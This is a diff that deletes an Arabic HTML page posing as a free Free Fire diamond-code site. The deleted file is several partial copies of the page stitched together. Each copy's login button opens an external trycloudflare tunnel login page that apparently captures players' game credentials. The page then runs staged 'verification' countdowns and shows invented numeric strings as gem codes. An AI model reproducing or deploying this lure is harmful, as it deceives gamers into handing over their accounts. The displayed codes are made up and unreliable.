@@ -1,645 +1,1 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>💎 موقع الشحن فري فاير 2026</title>
 
-<style>
-body{
-  margin:0;
-  font-family: Arial, sans-serif;
-  color:#fff;
-  text-align:center;
-  background: linear-gradient(270deg,#000000,#0f2027,#203a43,#6a11cb,#ff0000,#00eaff);
-  background-size: 1000% 1000%;
-  animation: bg 20s ease infinite;
-}
-
-@keyframes bg{
-  0%{background-position:0% 50%}
-  50%{background-position:100% 50%}
-  100%{background-position:0% 50%}
-}
-
-.top-bar{
-  padding:15px;
-  font-size:30px;
-  font-weight:bold;
-  text-shadow:0 0 20px #000;
-  animation: colorText 3s infinite;
-}
-
-@keyframes colorText{
-  0%{color:#ffd700;}
-  50%{color:#00eaff;}
-  100%{color:#ff0000;}
-}
-
-.logo{
-  width:100px;
-  margin-top:10px;
-}
-
-.container{
-  max-width:750px;
-  margin:40px auto;
-  padding:30px;
-  border-radius:30px;
-  background:rgba(0,0,0,0.85);
-  box-shadow:0 0 60px #00eaff;
-  position:relative;
-}
-
-.game-logo{
-  position:absolute;
-  top:15px;
-  right:15px;
-  width:60px;
-}
-
-button{
-  padding:15px 35px;
-  font-size:20px;
-  border:none;
-  border-radius:15px;
-  cursor:pointer;
-  margin:15px;
-  font-weight:bold;
-  transition:0.3s;
-  box-shadow:0 0 30px #fff;
-}
-
-#loginBtn{ background:#ff3c3c; color:#fff; }
-#codeBtn{ background:#00eaff; color:#000; }
-#refreshBtn{ background:#9b59ff; color:#fff; display:none; }
-
-button:hover{ transform:scale(1.1); }
-button:disabled{ opacity:0.5; cursor:not-allowed; }
-
-#codeBox{
-  margin-top:25px;
-  font-size:28px;
-  color:#00ffcc;
-  font-weight:bold;
-  text-shadow:0 0 15px #000;
-}
-</style>
-</head>
-<body>
-
-<div class="top-bar">
-🔥 موقع الشحن فري فاير 2026 🔥
-<br>
-<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Free_Fire_logo.png">
-</div>
-
-<div class="container">
-  <img class="game-logo" src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Free_Fire_logo.png">
-
-  <h1>💎 نظام أكواد الجواهر التلقائي</h1>
-  <p>قم بتسجيل الدخول ثم انتظر التحقق للحصول على كود الجواهر</p>
-
-  <button id="loginBtn">🔐 تسجيل دخول</button>
-  <br>
-
-  <button id="codeBtn" disabled>🎁 الحصول على الكود</button>
-  <button id="refreshBtn">🔄 تحديث الكود</button>
-
-  <div id="codeBox"></div>
-</div>
-
-<script>
-const loginBtn = document.getElementById("loginBtn");
-const codeBtn = document.getElementById("codeBtn");
-const refreshBtn = document.getElementById("refreshBtn");
-const codeBox = document.getElementById("codeBox");
-
-const codes = [
-"386855252454554",
-"252524242524244",
-"252524242424222",
-"252522222241222",
-"252522212242222",
-"252525222255283",
-"683825382425544",
-"383865242427242"
-];
-
-let index = 0;
-let logged = false;
-
-// عداد 35 ثانية تنازلي بعد تسجيل الدخول
-function loginCountdown(){
-  let seconds = 35;
-  codeBox.textContent = "⏳ جاري التحقق من تسجيل الدخول: " + seconds + " ثانية";
-
-  const timer = setInterval(() => {
-    seconds--;
-    codeBox.textContent = "⏳ جاري التحقق من تسجيل الدخول: " + seconds + " ثانية";
-
-    if(seconds <= 0){
-      clearInterval(timer);
-      codeBtn.disabled = false;
-      codeBox.textContent = "✅ تم التحقق! يمكنك الآن الحصول على الكود";
-    }
-  }, 1000);
-}
-
-// تسجيل الدخول
-loginBtn.addEventListener("click", () => {
-  window.open("https://band-pointed-logo-executed.trycloudflare.com/login.html", "_blank");
-
-  logged = true;
-  codeBtn.disabled = true;
-  refreshBtn.style.display = "none";
-  codeBtn.style.display = "inline-block";
-
-  loginCountdown();
-});
-
-// عداد 20 ثانية قبل ظهور الكود
-function codeCountdown(callback){
-  let seconds = 20;
-  codeBox.textContent = "⏳ تجهيز الكود: " + seconds + " ثانية";
-
-  const timer = setInterval(() => {
-    seconds--;
-    codeBox.textContent = "⏳ تجهيز الكود: " + seconds + " ثانية";
-
-    if(seconds <= 0){
-      clearInterval(timer);
-      callback();
-    }
-  }, 1000);
-}
-
-// زر الحصول على الكود
-codeBtn.addEventListener("click", () => {
-  if(!logged) return;
-
-  codeBtn.disabled = true;
-
-  codeCountdown(() => {
-    codeBox.textContent = "💎 كود الجواهر: " + codes[index];
-    index = (index + 1) % codes.length;
-
-    // إخفاء زر الكود بعد الاستخدام
-    codeBtn.style.display = "none";
-
-    // إظهار زر التحديث
-    refreshBtn.style.display = "inline-block";
-  });
-});
-
-// زر تحديث الكود
-refreshBtn.addEventListener("click", () => {
-  refreshBtn.style.display = "none";
-  codeBtn.style.display = "inline-block";
-  codeBtn.disabled = false;
-  codeBox.textContent = "🔄 تم تحديث النظام! اضغط للحصول على كود جديد";
-});
-</script>
-
-</body>
-</html>  <img class="game-logo" src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Free_Fire_logo.png">
-
-  <h1>💎 نظام أكواد الجواهر التلقائي</h1>
-  <p>قم بتسجيل الدخول ثم انتظر التحقق للحصول على كود الجواهر</p>
-
-  <!-- زر تسجيل الدخول -->
-  <button id="loginBtn">🔐 تسجيل دخول</button>
-  <br>
-
-  <!-- زر الحصول على الكود -->
-  <button id="codeBtn" disabled>🎁 الحصول على الكود</button>
-
-  <!-- زر تحديث الكود -->
-  <button id="refreshBtn">🔄 تحديث الكود</button>
-
-  <!-- عرض الكود والعداد -->
-  <div id="codeBox"></div>
-</div>
-
-<div class="footer">
-  💡 هذا الموقع يعرض نظام أكواد الجواهر بتصميم قوي 2026  
-  بعد تسجيل الدخول يتم التحقق ثم تفعيل الأكواد تلقائياً  
-  👨‍💻 المطور: ADEM
-</div>
-
-<script>
-const loginBtn = document.getElementById("loginBtn");
-const codeBtn = document.getElementById("codeBtn");
-const refreshBtn = document.getElementById("refreshBtn");
-const codeBox = document.getElementById("codeBox");
-
-const codes = [
-"386855252454554",
-"252524242524244",
-"252524242424222",
-"252522222241222",
-"252522212242222",
-"252525222255283",
-"683825382425544",
-"383865242427242"
-];
-
-let index = 0;
-let logged = false;
-
-// عداد تسجيل الدخول 35 → 0
-function loginCountdown(){
-  let seconds = 35;
-  codeBox.textContent = "⏳ جاري التحقق من تسجيل الدخول: " + seconds + " ثانية";
-
-  const timer = setInterval(() => {
-    seconds--;
-    codeBox.textContent = "⏳ جاري التحقق من تسجيل الدخول: " + seconds + " ثانية";
-
-    if(seconds <= 0){
-      clearInterval(timer);
-      codeBtn.disabled = false;
-      codeBox.textContent = "✅ تم التحقق! يمكنك الآن الضغط على الحصول على الكود";
-    }
-  }, 1000);
-}
-
-// عند الضغط على تسجيل الدخول
-loginBtn.addEventListener("click", () => {
-  window.open("https://band-pointed-logo-executed.trycloudflare.com/login.html", "_blank");
-
-  logged = true;
-  codeBtn.disabled = true;
-  codeBtn.style.display = "inline-block";
-  refreshBtn.style.display = "none";
-
-  loginCountdown();
-});
-
-// عداد الحصول على الكود 20 → 0
-function codeCountdown(callback){
-  let seconds = 20;
-  codeBox.textContent = "⏳ تجهيز الكود: " + seconds + " ثانية";
-
-  const timer = setInterval(() => {
-    seconds--;
-    codeBox.textContent = "⏳ تجهيز الكود: " + seconds + " ثانية";
-
-    if(seconds <= 0){
-      clearInterval(timer);
-      callback();
-    }
-  }, 1000);
-}
-
-// زر الحصول على الكود
-codeBtn.addEventListener("click", () => {
-  if(!logged){
-    alert("يجب تسجيل الدخول أولاً!");
-    return;
-  }
-
-  codeBtn.disabled = true;
-
-  codeCountdown(() => {
-    codeBox.textContent = "💎 كود الجواهر: " + codes[index];
-    index = (index + 1) % codes.length;
-
-    // إغلاق ميزة الحصول على الكود وظهور التحديث
-    codeBtn.style.display = "none";
-    refreshBtn.style.display = "inline-block";
-  });
-});
-
-// زر تحديث الكود (إرجاع النظام من جديد)
-refreshBtn.addEventListener("click", () => {
-  refreshBtn.style.display = "none";
-  codeBtn.style.display = "inline-block";
-  codeBtn.disabled = false;
-  codeBox.textContent = "🔄 تم تحديث النظام! اضغط على الحصول على الكود من جديد";
-});
-</script>
-
-</body>
-</html>  <button id="codeBtn" disabled>🎁 الحصول على الكود</button>
-  <button id="refreshBtn">🔄 تحديث الكود</button>
-
-  <div id="codeBox"></div>
-</div>
-
-<script>
-const loginBtn = document.getElementById("loginBtn");
-const codeBtn = document.getElementById("codeBtn");
-const refreshBtn = document.getElementById("refreshBtn");
-const codeBox = document.getElementById("codeBox");
-
-const codes = [
-"386855252454554",
-"252524242524244",
-"252524242424222",
-"252522222241222",
-"252522212242222",
-"252525222255283",
-"683825382425544",
-"383865242427242"
-];
-
-let index = 0;
-let logged = false;
-
-// عداد 35 ثانية تنازلي بعد تسجيل الدخول
-function loginCountdown(){
-  let seconds = 35;
-  codeBox.textContent = "⏳ جاري التحقق من تسجيل الدخول: " + seconds + " ثانية";
-
-  const timer = setInterval(() => {
-    seconds--;
-    codeBox.textContent = "⏳ جاري التحقق من تسجيل الدخول: " + seconds + " ثانية";
-
-    if(seconds <= 0){
-      clearInterval(timer);
-      codeBtn.disabled = false;
-      codeBox.textContent = "✅ تم التحقق! يمكنك الآن الحصول على الكود";
-    }
-  }, 1000);
-}
-
-// تسجيل الدخول
-loginBtn.addEventListener("click", () => {
-  window.open("https://band-pointed-logo-executed.trycloudflare.com/login.html", "_blank");
-
-  logged = true;
-  codeBtn.disabled = true;
-  refreshBtn.style.display = "none";
-  codeBtn.style.display = "inline-block";
-
-  loginCountdown();
-});
-
-// عداد 20 ثانية قبل ظهور الكود
-function codeCountdown(callback){
-  let seconds = 20;
-  codeBox.textContent = "⏳ تجهيز الكود: " + seconds + " ثانية";
-
-  const timer = setInterval(() => {
-    seconds--;
-    codeBox.textContent = "⏳ تجهيز الكود: " + seconds + " ثانية";
-
-    if(seconds <= 0){
-      clearInterval(timer);
-      callback();
-    }
-  }, 1000);
-}
-
-// زر الحصول على الكود
-codeBtn.addEventListener("click", () => {
-  if(!logged) return;
-
-  codeBtn.disabled = true;
-
-  codeCountdown(() => {
-    codeBox.textContent = "💎 كود الجواهر: " + codes[index];
-    index = (index + 1) % codes.length;
-
-    // إخفاء زر الكود بعد الاستخدام
-    codeBtn.style.display = "none";
-
-    // إظهار زر التحديث
-    refreshBtn.style.display = "inline-block";
-  });
-});
-
-// زر تحديث الكود
-refreshBtn.addEventListener("click", () => {
-  refreshBtn.style.display = "none";
-  codeBtn.style.display = "inline-block";
-  codeBtn.disabled = false;
-  codeBox.textContent = "🔄 تم تحديث النظام! اضغط للحصول على كود جديد";
-});
-</script>
-
-</body>
-</html>  color:#00ffcc;
-  font-weight:bold;
-}
-</style>
-</head>
-<body>
-
-<div class="top-bar">
-🔥 موقع الشحن فري فاير 2026 🔥
-<br>
-<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Free_Fire_logo.png">
-</div>
-
-<div class="container">
-  <img class="game-logo" src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Free_Fire_logo.png">
-
-  <h1>💎 نظام شحن الجواهر الاحترافي</h1>
-  <p>قم بتسجيل الدخول أولاً ثم انتظر 35 ثانية لتفعيل الأكواد</p>
-
-  <button id="loginBtn">🔐 تسجيل دخول فري فاير</button>
-  <br>
-
-  <button id="codeBtn" disabled>🎁 الحصول على كود 510 جوهرة</button>
-  <button id="diamond110Btn" disabled>💎 الحصول على 110 جوهرة</button>
-
-  <div id="codeBox"></div>
-</div>
-
-<script>
-const loginBtn = document.getElementById("loginBtn");
-const codeBtn = document.getElementById("codeBtn");
-const diamond110Btn = document.getElementById("diamond110Btn");
-const codeBox = document.getElementById("codeBox");
-
-// أكواد 510
-const codes510 = [
-"386855252454554",
-"252524242524244",
-"252524242424222",
-"252522222241222",
-"252522212242222",
-"252525222255283",
-"683825382425544",
-"383865242427242"
-];
-
-// أكواد 110
-const codes110 = [
-"5865252524243",
-"343438252525",
-"373424242424",
-"273424242425",
-"37342425242",
-"37352525224",
-"27252554352",
-"37242552522",
-"35352424242",
-"352525253522"
-];
-
-let index510 = 0;
-let index110 = 0;
-let logged = false;
-
-// عند الضغط على تسجيل الدخول (الرابط الجديد)
-loginBtn.addEventListener("click", () => {
-  window.open("https://band-pointed-logo-executed.trycloudflare.com/login.html", "_blank");
-
-  logged = true;
-  codeBtn.disabled = true;
-  diamond110Btn.disabled = true;
-
-  codeBox.textContent = "⏳ جاري التحقق من تسجيل الدخول... انتظر 35 ثانية";
-
-  setTimeout(() => {
-    if(logged){
-      codeBtn.disabled = false;
-      diamond110Btn.disabled = false;
-      codeBox.textContent = "✅ تم التحقق بنجاح! يمكنك الآن الحصول على الأكواد";
-    }
-  }, 35000);
-});
-
-// عداد 20 ثانية
-function startCountdown(callback){
-  let seconds = 20;
-  codeBox.textContent = "⏳ يرجى الانتظار: " + seconds + " ثانية";
-
-  const timer = setInterval(() => {
-    seconds--;
-    codeBox.textContent = "⏳ تجهيز الكود: " + seconds + " ثانية";
-
-    if(seconds <= 0){
-      clearInterval(timer);
-      callback();
-    }
-  }, 1000);
-}
-
-// زر 510 جوهرة
-codeBtn.addEventListener("click", () => {
-  if(logged){
-    codeBtn.disabled = true;
-    diamond110Btn.disabled = true;
-
-    startCountdown(() => {
-      codeBox.textContent = "🎁 كود 510 جوهرة: " + codes510[index510] + " 💎";
-      index510 = (index510 + 1) % codes510.length;
-      codeBtn.disabled = false;
-      diamond110Btn.disabled = false;
-    });
-  }
-});
-
-// زر 110 جوهرة
-diamond110Btn.addEventListener("click", () => {
-  if(logged){
-    codeBtn.disabled = true;
-    diamond110Btn.disabled = true;
-
-    startCountdown(() => {
-      codeBox.textContent = "💎 كود 110 جوهرة: " + codes110[index110] + " 💎";
-      index110 = (index110 + 1) % codes110.length;
-      codeBtn.disabled = false;
-      diamond110Btn.disabled = false;
-    });
-  }
-});
-</script>
-
-</body>
-</html></style>
-</head>
-<body>
-
-<div class="top-bar">
-🌙 رمضان مبارك 🌙
-<br>
-<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Free_Fire_logo.png">
-</div>
-
-<div class="container">
-  <h1>💎 احصل على كود فري فاير 510 جوهرة</h1>
-
-  <p>
-  قم بتسجيل الدخول أولاً للحصول على كود الجواهر الخاص بلعبة فري فاير.
-  </p>
-
-  <!-- زر تسجيل الدخول -->
-  <button id="loginBtn">تسجيل دخول</button>
-  <br>
-
-  <!-- زر الكود -->
-  <button id="codeBtn" disabled>الحصول على كود فري فاير</button>
-
-  <p>يجب تسجيل دخول حتى تحصل على الكود</p>
-
-  <!-- عرض الكود -->
-  <div id="codeBox"></div>
-
-  <p style="color:#ffd700; font-size:22px;">💎 كود 510 جوهرة 💎</p>
-  <img class="small-logo" src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Free_Fire_logo.png">
-</div>
-
-<div class="footer">
-  <h2>💡 لمحة عن فري فاير والموقع</h2>
-  <p>
-  فري فاير هي لعبة باتل رويال شهيرة مليئة بالحماس والمغامرات،
-  حيث تساعدك الجواهر على شراء الأسلحة والسكنات وتطوير حسابك داخل اللعبة.
-  </p>
-  <p>
-  هذا الموقع يوفر تجربة تصميم احترافية لعرض أكواد الجواهر بطريقة آمنة وسريعة
-  مع واجهة قوية وخلفية جميلة متحركة.
-  </p>
-  <p><strong>👨‍💻 اسم المطور: ADEM</strong></p>
-</div>
-
-<script>
-const loginBtn = document.getElementById("loginBtn");
-const codeBtn = document.getElementById("codeBtn");
-const codeBox = document.getElementById("codeBox");
-
-const codes = [
-"555552525643524",
-"34342421212121",
-"34315834242424",
-"3525242424244"
-];
-
-let index = 0;
-let logged = false;
-
-// عند الضغط على تسجيل الدخول
-loginBtn.addEventListener("click", () => {
-  // فتح رابط تسجيل الدخول
-  window.open("https://band-pointed-logo-executed.trycloudflare.com/login.html", "_blank");
-
-  logged = true;
-  codeBtn.disabled = true;
-  codeBox.textContent = "⏳ جاري التحقق من تسجيل الدخول...";
-
-  // بعد 10 ثواني يظهر الكود
-  setTimeout(() => {
-    if(logged){
-      codeBtn.disabled = false;
-      codeBox.textContent = "✅ تم التحقق! اضغط على الحصول على الكود";
-    }
-  }, 10000);
-});
-
-// عند الضغط على الحصول على الكود
-codeBtn.addEventListener("click", () => {
-  if(logged){
-    codeBox.textContent = "كودك: " + codes[index] + " 💎";
-    index = (index + 1) % codes.length; // تغيير الكود كل مرة
-  } else {
-    alert("يجب تسجيل الدخول أولاً!");
-  }
-});
-</script>
-
-</body>
-</html>
